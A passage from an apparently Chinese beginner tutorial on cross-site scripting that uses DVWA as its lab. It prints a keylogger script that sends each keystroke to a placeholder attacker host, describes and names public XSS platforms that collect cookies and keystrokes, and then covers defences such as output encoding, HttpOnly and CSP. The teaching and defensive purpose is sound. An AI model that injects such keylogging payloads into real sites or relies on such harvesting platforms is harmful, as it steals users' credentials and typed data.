XSS还可以记录你在网页上敲的所有内容！

比如注入这样的代码：
```javascript
<script>
    document.onkeypress = function(e) {
        var key = String.fromCharCode(e.which);
        // 把按键发送到攻击者的服务器
        new Image().src = 'http://攻击者的网站/keylog.php?key=' + key;
    }
</script>
```

这样一来，你在这个页面上输入的所有东西——用户名、密码、信用卡号——都会被记录下来，发送给攻击者！

太可怕了有没有！😨

### 5. 网站篡改 📝

攻击者还可以通过XSS修改网页的内容。

比如把新闻网站的头条改成假新闻，把电商网站的价格改成1块钱，或者在网站上挂政治敏感内容……

虽然这些改动只是在用户浏览器里临时的（存储型XSS的话可能是永久的），但影响也很坏。

### 6. DDoS攻击 💥

更狠一点的，攻击者可以利用XSS让所有访问页面的用户都变成"肉鸡"，一起去攻击某个网站，造成DDoS（分布式拒绝服务攻击）。

一个人的浏览器可能没什么，但是如果有一万个用户同时访问一个有存储型XSS的页面，那就是一万个请求同时打过去，小网站直接就被打垮了。

---

## XSS平台简介 🌐

你可能会问：搞XSS还要自己搭服务器收Cookie、收键盘记录吗？好麻烦啊……

别急，早就有人帮我们做好了！这就是"XSS平台"。

### 什么是XSS平台？

XSS平台是一种已经搭建好的网站，你只要注册一个账号，就能生成专属的XSS攻击代码。把这段代码注入到有漏洞的网站里，中招的用户的各种信息（Cookie、浏览器信息、输入内容等等）就会自动发送到XSS平台上，你登录你的账号就能看到。

简单说就是：别人帮你搭好了服务器，你直接用就行。

### XSS平台能做什么？

一般的XSS平台都支持这些功能：
- 🍪 获取Cookie
- 📱 获取浏览器信息（User-Agent）
- 🌍 获取IP地址和地理位置
- ⌨️ 键盘记录
- 📋 剪贴板内容
- 👆 鼠标位置记录
- 📸 网页截图
- 🔄 页面重定向
- ……还有很多

功能非常强大！

### 常见的XSS平台

有一些公开的XSS平台，也可以自己搭建。比如：
- xss.pt
- xss.cc
- BlueLotus_XSSReceiver（蓝莲花）
- 各种开源的XSS平台项目

> ⚠️ **重要提醒：** XSS平台只能用于授权的安全测试！未经允许用XSS攻击别人的网站是违法的！我们学习这些知识是为了防御，不是为了搞破坏！记住了吗？

---

## XSS防御方法 🛡️

好了，攻击的方法我们学了不少，现在该学学怎么防御了。毕竟，我们学安全的最终目的是让系统更安全，对不对？

XSS的防御方法有很多，我们一个一个来讲。

### 1. 输出编码（最重要！）🏆

这是防御XSS最核心、最有效的方法！

原理很简单：用户输入的内容，在输出到HTML页面之前，先进行HTML实体编码。把那些特殊字符（`<`、`>`、`"`、`'`、`&`）都转换成实体字符。

比如：
- `<` → `&lt;`
- `>` → `&gt;`
- `"` → `&quot;`
- `'` → `&#039;`
- `&` → `&amp;`

这样一来，用户输入的`<script>`就会变成`&lt;script&gt;`，浏览器看到这个，就知道这是文本内容，不是HTML标签，就不会解析执行了。

在PHP里，可以用`htmlspecialchars()`函数：
```php
echo htmlspecialchars($user_input);
```

在JavaScript里，如果你要往DOM里插文本，可以用`textContent`而不是`innerHTML`：
```javascript
// 安全的做法
document.getElementById('xxx').textContent = userInput;

// 危险的做法
document.getElementById('xxx').innerHTML = userInput;
```

> 💡 **为什么输出编码最重要？** 因为输入过滤可能会被绕过，但是输出编码几乎是不可能绕过的——只要编码做对了，不管你输入什么，都只会被当成文本显示。

### 2. 输入过滤 🚫

除了输出编码，我们还可以对用户输入进行过滤。

不过要注意：输入过滤是辅助手段，不能替代输出编码！

输入过滤分两种：

**黑名单过滤：** 规定哪些东西不能有，比如不能有`<script>`、不能有`javascript:`等等。
- 缺点：很容易被绕过，因为黑名单列不全所有危险的东西

**白名单过滤：** 规定只能有什么，比如只能是数字、只能是字母、只能是邮箱格式等等。
- 优点：安全，因为只允许已知安全的内容
- 缺点：适用场景有限，不是所有输入都能定义白名单

能用白名单的地方尽量用白名单，比如手机号、邮箱、身份证号这些格式固定的输入。

### 3. HttpOnly Cookie 🍪

这个是专门用来防御Cookie窃取的。

给Cookie设置`HttpOnly`属性后，JavaScript就无法通过`document.cookie`读取Cookie了。这样就算有XSS漏洞，攻击者也偷不到Cookie，大大降低了危害。

在PHP里设置HttpOnly：
```php
session.cookie_httponly = On  // 在php.ini里设置
// 或者
setcookie("user", "abc", time()+3600, "/", "", false, true); 
// 最后一个参数true就是设置HttpOnly
```

这个虽然不能防止XSS，但是能减轻XSS的危害，非常实用！

### 4. CSP（内容安全策略）🛡️

CSP是Content Security Policy的缩写，中文叫"内容安全策略"。这是一个比较新的浏览器安全机制。

简单说，CSP就是告诉浏览器：这个网页只能从哪些地方加载资源，哪些脚本可以执行，哪些不行。

如果设置了严格的CSP，就算有XSS漏洞，攻击者注入的脚本也执行不了——因为浏览器不信任它！

CSP通过HTTP响应头来设置，比如：
```
Content-Security-Policy: default-src 'self'
```

这个意思是：所有资源都只能从当前域名加载。这样攻击者注入的内联脚本、外部脚本，都会被浏览器拦截。

CSP是一个非常强大的防御手段，但是配置起来比较复杂，而且可能会影响网站正常功能。所以一般是作为纵深防御的一环，不是第一道防线。

### 5. 其他防御手段 📦

还有一些其他的防御方法：
- 输入长度限制：对用户输入的长度做限制，增加攻击难度
- 使用框架的自动转义：现代的Web框架（比如React、Vue）默认都会对输出进行编码，大大减少了XSS的风险
- 定期安全测试：经常检查网站有没有XSS漏洞

### 防御原则总结 📋

记住这几条原则，XSS就很难找上你：

1. **永远不要相信用户的输入！** 所有用户输入都是危险的
2. **输出编码是第一道防线，也是最有效的防线**
3. **输入过滤只能作为辅助，不能靠它防御XSS**
4. **能用白名单就用白名单，不要用黑名单**
5. **设置HttpOnly Cookie，减轻危害**
6. **开启CSP，增加一层防护**
7. **尽量使用现代Web框架，它们默认帮你做了很多防护**

---

## 新手常见问题FAQ ❓

### Q1：XSS和SQL注入有啥区别？

**A：** 完全是两种不同的漏洞哦！
- **SQL注入：** 把SQL命令注入到数据库查询里，攻击的是数据库，危害是数据泄露、数据篡改
- **XSS：** 把JavaScript代码注入到网页里，攻击的是其他用户的浏览器，危害是偷Cookie、钓鱼、挂马等等

简单说，一个是搞服务器数据库的，一个是搞其他用户浏览器的。

### Q2：为啥叫"跨站脚本"？跨的啥站？

**A：** 这个名字其实有点历史原因。最早的时候，XSS主要是用来从一个网站窃取数据发送到另一个网站，所以叫"跨站"。

但是现在XSS的危害远不止跨站了，名字就一直沿用下来了。你可以不用纠结名字，知道它是往网页里注入JS代码的攻击就行。

### Q3：反射型XSS好像没啥用啊？还得骗用户点链接，直接发个钓鱼网站不行吗？

**A：** 不一样哦！反射型XSS是出现在**真实的网站域名**下的，用户一看网址是对的，警惕性就低了。

比如你收到一个链接，是`taobao.com/xxx?search=<script>...</script>`，你一看是淘宝的域名，可能就点了。但如果是`taobao-fake.com`，你可能就不点了。

而且反射型XSS可以偷到用户在这个网站的Cookie，钓鱼网站可偷不到。

### Q4：DOM型XSS和反射型XSS好像啊！怎么区分？

**A：** 最简单的区分方法：看恶意代码有没有经过服务器处理。
- **反射型：** 恶意代码是服务器返回的HTML里带的（服务器把URL里的内容拼到HTML里了）
- **DOM型：** 恶意代码是前端JS自己取出来插到页面上的（服务器返回的HTML里没有恶意代码）

你可以这样判断：右键查看网页源代码（不是审查元素，是查看源代码），如果能看到你的恶意代码，就是反射型；如果看不到，就是DOM型。

### Q5：我用了htmlspecialchars，是不是就绝对安全了？

**A：** 大部分情况下是安全的，但也不是100%绝对。比如：
- 如果输出的位置是在HTML标签的属性里（比如`<input value="...">`），需要注意引号的问题
- 如果输出的位置是在JavaScript代码里（比如`<script>var a = "...";</script>`），需要做JS编码
- 如果输出的位置是在CSS里，需要做CSS编码

不同的输出位置需要不同的编码方式。不过htmlspecialchars能防御绝大多数普通场景的XSS了。

### Q6：XSS能拿服务器权限吗？

**A：** 一般来说不能。XSS是客户端漏洞，攻击的是用户的浏览器，不是服务器。

但是，如果管理员被XSS攻击了，攻击者拿到了管理员的Cookie，登录了后台，那可能就能进一步拿服务器权限了。但这不是XSS直接造成的，是间接的。

---

## 本章总结 📝

恭喜你！学完了这一章，你已经掌握了XSS的基础知识！我们来回顾一下都学了啥：

### 核心知识点回顾 ✅

1. **什么是XSS？**
   - 往网页里注入恶意JS代码，其他用户访问时执行
   - 根本原因：用户输入未过滤，直接输出到页面

2. **XSS的三种类型：**
   - 🔄 **反射型：** 非持久化，恶意代码在URL里，需要诱骗点击
   - 💾 **存储型：** 持久化，存在数据库里，所有人访问都中招，危害最大
   - 🌲 **DOM型：** 不经过服务器，完全在浏览器端发生

3. **DVWA四个级别：**
   - 🟢 Low：完全没过滤，直接上
   - 🟡 Medium：过滤了`<script>`，可以用大小写、其他标签绕过
   - 🔴 High：用正则过滤script相关，用其他标签和事件绕过
   - ⚪ Impossible：用htmlspecialchars输出编码，正确的防御姿势

4. **XSS的危害：**
   - 偷Cookie、钓鱼、挂马、键盘记录、网站篡改、DDoS……

5. **XSS的防御：**
   - 🏆 输出编码（最重要！htmlspecialchars）
   - 🚫 输入过滤（白名单优于黑名单）
   - 🍪 HttpOnly Cookie
   - 🛡️ CSP内容安全策略

### 学习建议 💡

- 多动手实战，光看是学不会的
- 可以去XSS平台玩玩，了解更多XSS利用姿势
- 尝试自己写一段有XSS漏洞的代码，然后再修复它
- 多看看真实的XSS漏洞案例，拓宽思路

---

## 下章预告 📢

XSS我们就学到这里啦！下一章我们会继续在DVWA里探索，学习其他好玩的漏洞模块。

后面我们还会学习：
- 📁 文件上传漏洞
- ⚠️ 命令执行漏洞
- 🔐 还有更多有趣的安全知识！

是不是很期待呢？我们下章见！👋

---

> 💡 **温馨提示：** 学习安全知识是为了保护网络安全，不是为了搞破坏哦！未经授权测试别人的网站是违法行为，请遵守法律法规，做一个正义的白帽子！🦸
